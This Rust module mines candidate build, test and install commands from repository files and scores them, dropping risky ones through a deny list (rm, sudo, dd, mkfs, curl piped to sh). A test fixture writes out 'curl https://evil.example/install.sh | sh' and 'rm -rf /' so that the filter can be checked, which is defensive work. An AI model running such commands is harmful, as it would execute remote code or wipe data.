//! Experiment planner: workload discovery and the action graph
//! (spec §13.4, FR-010..FR-017).
//!
//! The planner converts heterogeneous command hints — CI files, container
//! metadata, package scripts, Makefiles, documentation shell blocks,
//! runner recipes — into a normalized, scored action graph. It follows the
//! spec's ordering of candidate sources (§13.4) and treats everything as a
//! *candidate*: only experiment execution validates a command (FR-015).
//!
//! Miners are generic shell-command extractors, not semantic CI parsers;
//! small format parsers (GitHub Actions, package.json) improve precision
//! but remain provider modules, per §13.4.

pub mod miners;

use ovid_core::TrustTier;
use ovid_packs::PackRegistry;
use ovid_repository::RepoSnapshot;
use serde::{Deserialize, Serialize};

/// What an action is for.
#[derive(Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Debug)]
#[serde(rename_all = "kebab-case")]
pub enum ActionKind {
    DependencyInstall,
    Build,
    Test,
    Start,
    Probe,
    Other,
}

/// Where a candidate command came from — ordered by §13.4 priority.
#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize, Debug)]
#[serde(rename_all = "kebab-case")]
pub enum ActionSource {
    ExplicitUser,
    VerifiedRecipe,
    CiFile,
    ContainerMetadata,
    PackageScript,
    Makefile,
    Documentation,
    RunnerRecipe,
    ModelProposal,
}

impl ActionSource {
    /// Base confidence by source, per the §13.4 ordering.
    pub fn base_confidence(self) -> f64 {
        match self {
            ActionSource::ExplicitUser => 1.0,
            ActionSource::VerifiedRecipe => 0.95,
            ActionSource::CiFile => 0.85,
            ActionSource::ContainerMetadata => 0.75,
            ActionSource::PackageScript => 0.7,
            ActionSource::Makefile => 0.6,
            ActionSource::Documentation => 0.4,
            ActionSource::RunnerRecipe => 0.5,
            ActionSource::ModelProposal => 0.2,
        }
    }

    pub fn trust_tier(self) -> TrustTier {
        match self {
            ActionSource::ExplicitUser => TrustTier::T0,
            ActionSource::VerifiedRecipe => TrustTier::T1,
            ActionSource::ModelProposal => TrustTier::T5,
            _ => TrustTier::T4,
        }
    }
}

/// One candidate action in the graph (§13.4's normalized form).
#[derive(Clone, PartialEq, Serialize, Deserialize, Debug)]
pub struct Action {
    pub id: String,
    pub kind: ActionKind,
    pub command: Vec<String>,
    pub source: ActionSource,
    /// Repository-relative file the candidate was mined from.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source_file: Option<String>,
    /// Combined score: source confidence minus risk penalty (FR-013).
    pub score: f64,
    #[serde(default)]
    pub prerequisites: Vec<String>,
}

/// The scored candidate graph for one snapshot.
#[derive(Clone, Serialize, Deserialize, Debug, Default)]
pub struct ActionGraph {
    pub actions: Vec<Action>,
}

impl ActionGraph {
    /// Best candidate of a kind, if any.
    pub fn best(&self, kind: ActionKind) -> Option<&Action> {
        self.actions.iter().filter(|a| a.kind == kind).max_by(|a, b| {
            a.score.partial_cmp(&b.score).unwrap_or(std::cmp::Ordering::Equal)
        })
    }

    /// All candidates of a kind, best first.
    pub fn candidates(&self, kind: ActionKind) -> Vec<&Action> {
        let mut list: Vec<&Action> = self.actions.iter().filter(|a| a.kind == kind).collect();
        list.sort_by(|a, b| b.score.partial_cmp(&a.score).unwrap_or(std::cmp::Ordering::Equal));
        list
    }
}

/// Commands that must never be auto-executed from mined text (risk scoring,
/// FR-013). Matching is on the first token or well-known dangerous shapes.
fn risk_penalty(command: &[String]) -> f64 {
    let joined = command.join(" ");
    let first = command.first().map(String::as_str).unwrap_or("");
    if matches!(first, "rm" | "sudo" | "dd" | "mkfs" | "shutdown" | "reboot") {
        return 1.0; // effectively disqualified
    }
    if joined.contains("curl") && (joined.contains("| sh") || joined.contains("| bash")) {
        return 1.0; // remote-code piping
    }
    if joined.contains("--force") || joined.contains("-rf") {
        return 0.4;
    }
    0.0
}

/// Classify a shell command into an action kind by its verbs.
fn classify(command: &[String]) -> ActionKind {
    let joined = command.join(" ");
    let has = |needle: &str| joined.contains(needle);
    if has("install") || has("npm ci") || has("pip install") || has("uv sync") || has("bundle install") {
        ActionKind::DependencyInstall
    } else if has("test") || has("pytest") || has("check") || has("spec") {
        ActionKind::Test
    } else if has("build") || has("compile") || has("package") || has("assemble") {
        ActionKind::Build
    } else if has("start") || has("run ") || has("serve") || has("server") {
        ActionKind::Start
    } else {
        ActionKind::Other
    }
}

/// Mine and score all candidates for a snapshot (FR-011, FR-012, FR-013).
pub fn plan(snapshot: &RepoSnapshot, registry: &PackRegistry) -> ActionGraph {
    let mut actions: Vec<Action> = Vec::new();
    let mut counter = 0usize;
    let mut push = |command: Vec<String>,
                    source: ActionSource,
                    source_file: Option<String>,
                    kind_hint: Option<ActionKind>,
                    actions: &mut Vec<Action>| {
        if command.is_empty() {
            return;
        }
        let penalty = risk_penalty(&command);
        if penalty >= 1.0 {
            return; // dangerous candidates are dropped, not just downranked
        }
        counter += 1;
        let kind = kind_hint.unwrap_or_else(|| classify(&command));
        actions.push(Action {
            id: format!("action-{counter}"),
            kind,
            command,
            source,
            source_file,
            score: (source.base_confidence() - penalty).max(0.0),
            prerequisites: Vec::new(),
        });
    };

    for mined in miners::mine_all(snapshot) {
        push(mined.command, mined.source, mined.source_file, mined.kind_hint, &mut actions);
    }

    // Runner recipes: conventional commands for detected ecosystems.
    for (pack, recipe) in registry.detect_runners(snapshot) {
        let sets = [
            (&recipe.commands.install, ActionKind::DependencyInstall),
            (&recipe.commands.build, ActionKind::Build),
            (&recipe.commands.test, ActionKind::Test),
            (&recipe.commands.start, ActionKind::Start),
        ];
        for (commands, kind) in sets {
            for command in commands {
                push(
                    command.clone(),
                    ActionSource::RunnerRecipe,
                    Some(format!("pack:{}", pack.label())),
                    Some(kind),
                    &mut actions,
                );
            }
        }
    }

    // Dedup identical commands, keeping the highest-scoring provenance.
    let mut seen: std::collections::BTreeMap<String, usize> = Default::default();
    let mut deduped: Vec<Action> = Vec::new();
    for action in actions {
        let key = action.command.join("\u{1f}");
        match seen.get(&key) {
            Some(&index) => {
                if action.score > deduped[index].score {
                    deduped[index] = action;
                }
            }
            None => {
                seen.insert(key, deduped.len());
                deduped.push(action);
            }
        }
    }

    // Install actions become prerequisites of build/test/start candidates
    // (§13.4's prerequisite edges).
    let install_ids: Vec<String> = deduped
        .iter()
        .filter(|a| a.kind == ActionKind::DependencyInstall)
        .map(|a| a.id.clone())
        .collect();
    if !install_ids.is_empty() {
        for action in &mut deduped {
            if action.kind != ActionKind::DependencyInstall {
                action.prerequisites = install_ids.clone();
            }
        }
    }

    ActionGraph { actions: deduped }
}

#[cfg(test)]
mod tests {
    use super::*;
    use ovid_repository::{acquire, AcquireOptions, RepositorySource};

    fn snapshot_with(files: &[(&str, &str)]) -> RepoSnapshot {
        let dir = tempfile::tempdir().unwrap();
        for (path, contents) in files {
            let full = dir.path().join(path);
            std::fs::create_dir_all(full.parent().unwrap()).unwrap();
            std::fs::write(full, contents).unwrap();
        }
        let snap = acquire(
            &RepositorySource::parse(dir.path().to_str().unwrap(), None),
            &AcquireOptions::new(dir.path().join(".work")),
        )
        .unwrap();
        std::mem::forget(dir);
        snap
    }

    #[test]
    fn ci_commands_outrank_recipe_conventions() {
        let snapshot = snapshot_with(&[
            ("Cargo.toml", "[package]\nname = \"x\"\nversion = \"0.0.1\"\n"),
            (
                ".github/workflows/ci.yml",
                "jobs:\n  test:\n    steps:\n      - run: cargo test --workspace --all-features\n",
            ),
        ]);
        let registry = PackRegistry::builtin().unwrap();
        let graph = plan(&snapshot, &registry);
        let best = graph.best(ActionKind::Test).unwrap();
        assert_eq!(best.source, ActionSource::CiFile);
        assert!(best.command.join(" ").contains("--all-features"));
        // Recipe conventions still present as fallbacks.
        assert!(graph
            .candidates(ActionKind::Test)
            .iter()
            .any(|a| a.source == ActionSource::RunnerRecipe));
    }

    #[test]
    fn dangerous_commands_are_dropped() {
        let snapshot = snapshot_with(&[(
            "README.md",
            "## Install\n```sh\ncurl https://evil.example/install.sh | sh\nrm -rf /\ncargo build\n```\n",
        )]);
        let registry = PackRegistry::builtin().unwrap();
        let graph = plan(&snapshot, &registry);
        for action in &graph.actions {
            let joined = action.command.join(" ");
            assert!(!joined.contains("| sh"), "piped install must be dropped: {joined}");
            assert!(action.command[0] != "rm", "rm must be dropped");
        }
        assert!(graph.actions.iter().any(|a| a.command[0] == "cargo"));
    }

    #[test]
    fn install_becomes_prerequisite() {
        let snapshot = snapshot_with(&[(
            "package.json",
            r#"{"name":"a","scripts":{"test":"jest"},"dependencies":{}}"#,
        )]);
        let registry = PackRegistry::builtin().unwrap();
        let graph = plan(&snapshot, &registry);
        let test = graph.best(ActionKind::Test).unwrap();
        assert!(!test.prerequisites.is_empty(), "test should depend on install");
    }
}
